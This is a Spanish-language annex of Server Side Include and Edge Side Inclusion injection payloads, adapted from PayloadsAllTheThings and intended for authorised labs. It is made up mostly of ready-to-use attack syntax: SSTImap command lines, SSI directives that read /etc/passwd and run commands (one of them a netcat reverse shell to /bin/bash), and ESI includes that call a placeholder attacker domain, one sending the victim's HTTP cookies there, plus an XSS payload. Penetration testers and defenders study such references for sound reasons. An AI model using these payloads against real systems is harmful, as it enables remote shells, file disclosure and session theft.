# Code injection / eval: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [Server Side Include Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Include%20Injection/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Lado servidor Include Inyección / Herramientas

```bash
  python3 ./sstimap.py -u 'https://example.com/page?name=John' --legacy -s
  python3 ./sstimap.py -i -u 'https://example.com/page?name=Vulnerable*&message=My_message' -l 5 -e SSI
  python3 ./sstimap.py -i --legacy -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk'
```

### Variantes presentes en tablas o texto del apartado

```text
--legacy
-e SSI
```

## 2. Lado servidor Include Inyección / Metodología

### Variantes presentes en tablas o texto del apartado

```text
<!--#directive param="value" -->
<!--#echo var="DATE_LOCAL" -->
<!--#echo var="DOCUMENT_NAME" -->
<!--#printenv -->
<!--#set var="name" value="Rich" -->
<!--#include file="/etc/passwd" -->
<!--#include virtual="/index.html" -->
<!--#exec cmd="ls" -->
<!--#exec cmd="mkfifo /tmp/f;nc IP PORT 0</tmp/f\|/bin/bash 1>/tmp/f;rm /tmp/f" -->
```

## 3. Lado servidor Include Inyección / Edge Side Inclusion

```ps1
Surrogate-Control: content="ESI/1.0"
```

### Variantes presentes en tablas o texto del apartado

```text
<esi:include src=http://[ATTACKER.DOMAIN.TLD]>
<esi:include src=http://[ATTACKER.DOMAIN.TLD]/XSSPAYLOAD.html>
<esi:include src=http://[ATTACKER.DOMAIN.TLD]/?cookie_stealer.php?=$(HTTP_COOKIE)>
<esi:include src="supersecret.txt">
<esi:debug/>
<!--esi $add_header('Location','http://[ATTACKER.DOMAIN.TLD]') -->
<esi:inline name="/attack.html" fetchable="yes"><script>prompt('XSS')</script></esi:inline>
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
